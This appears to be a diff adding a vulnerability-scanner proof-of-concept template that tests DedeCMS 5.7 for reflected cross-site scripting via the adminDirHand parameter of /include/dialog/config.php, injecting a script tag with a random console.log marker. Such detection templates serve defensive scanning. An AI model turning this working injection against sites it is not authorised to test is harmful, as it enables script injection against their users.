@@ -1,0 +1,16 @@
+name: poc-dedecms-config-xss
+set:
+  r: randomInt(800000000, 1000000000)
+  ident: bytes("console.log("+string(r)+")")
+rules:
+  - method: GET
+    path: >-
+        /include/dialog/config.php?adminDirHand="/></script><script>console.log({{r}})</script>
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(ident)
+detail:
+  author: harris2015(https://github.com/harris2015)
+  Affected Version: "5.7"
+  links:
+    - http://bbs.dedecms.com/612431.html
